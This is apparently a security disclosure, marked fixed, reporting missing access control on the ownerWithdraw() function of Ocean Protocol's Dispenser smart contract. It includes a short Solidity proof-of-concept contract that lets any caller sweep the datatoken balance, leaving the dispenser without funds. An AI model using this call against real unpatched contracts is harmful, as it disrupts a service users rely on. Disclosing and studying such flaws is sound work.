# Improper Access Control on Ocean Protocol Dispenser Contract

## Target: *https://github.com/oceanprotocol/contracts/blob/v4main/contracts/pools/dispenser/Dispenser.sol*

## Severity: Medium

## Status : Fixed

## Commit: *https://github.com/oceanprotocol/contracts/commit/421894dadb7bb5b51340afe022ae716c280670f0*

## Bug Description
*The function ownerWithdraw() is not protected with proper access controls and leaves anyone to call the function and sweeps the entire balance of data token that which Dispenser contract hold*

## Permalink
https://github.com/oceanprotocol/contracts/blob/b937a12b50dc4bdb7a6901c33e5c8fa136697df7/contracts/pools/dispenser/Dispenser.sol#L253
https://github.com/oceanprotocol/contracts/blob/b937a12b50dc4bdb7a6901c33e5c8fa136697df7/contracts/pools/dispenser/Dispenser.sol#L261

## Proof Of Concept :
```
pragma solidity ^0.8.12;

interface IDispenser {
    function ownerWithdraw(address datatoken) external;
}

contract sweep {
    IDispenser dispenser = IDispenser(DISPENSER_ADDRESS);
    function sweep() external {
        dispenser.ownerWithdraw(DATATOKEN_ADDRESS);
    }
}
```
## Impact
*The balance is entirely transferred to the payment collector and makes "Smart contract unable to operate due to lack of token funds".
The Token Funds are used in the dispense() function and transferred to the destination address called by users who hold the DT tokens.*

## Recommendation
*Need to Implement Access Control.*
